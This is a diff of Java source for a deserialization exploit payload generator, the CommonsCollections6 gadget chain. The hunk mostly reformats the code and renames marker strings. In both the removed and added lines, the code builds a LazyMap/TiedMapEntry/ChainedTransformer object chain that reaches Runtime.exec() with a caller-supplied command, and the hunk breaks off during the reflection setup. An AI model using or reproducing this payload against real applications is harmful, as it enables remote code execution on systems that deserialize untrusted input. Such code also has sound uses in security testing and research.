@@ -18,34 +18,32 @@ import java.util.HashSet;
 import java.util.Map;
 
 /**
- * 	Gadget chain:
- * 	    java.io.ObjectInputStream.readObject()
- *             java.util.HashSet.readObject()
- *                 java.util.HashMap.put()
- *                 java.util.HashMap.hash()
- *                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
- *                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
- *                         org.apache.commons.collections.map.LazyMap.get()
- *                             org.apache.commons.collections.functors.ChainedTransformer.transform()
- *                             org.apache.commons.collections.functors.InvokerTransformer.transform()
- *                             java.lang.reflect.Method.invoke()
- *                                 java.lang.Runtime.exec()
- *
- *     by @matthias_kaiser
+ * Gadget chain:
+ * java.io.ObjectInputStream.readObject()
+ * java.util.HashSet.readObject()
+ * java.util.HashMap.put()
+ * java.util.HashMap.hash()
+ * org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+ * org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+ * org.apache.commons.collections.map.LazyMap.get()
+ * org.apache.commons.collections.functors.ChainedTransformer.transform()
+ * org.apache.commons.collections.functors.InvokerTransformer.transform()
+ * java.lang.reflect.Method.invoke()
+ * java.lang.Runtime.exec()
+ * <p>
+ * by @matthias_kaiser
  */
 public class CommonsCollections6 implements ObjectPayload<Byte> {
 
     public byte[] getBytes(PayloadType type, String... param) throws Exception {
-        String command = param[0];
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
-
-        Transformer transformerChain = new ChainedTransformer(transformers);
-
-        final Map innerMap = new HashMap();
-        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
-        HashSet map = new HashSet(1);
-        map.add("su18");
+        String              command          = param[0];
+        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
+        Transformer         transformerChain = new ChainedTransformer(transformers);
+        final Map           innerMap         = new HashMap();
+        final Map           lazyMap          = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry        entry            = new TiedMapEntry(lazyMap, "nu1r");
+        HashSet             map              = new HashSet(1);
+        map.add("nu1r");
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
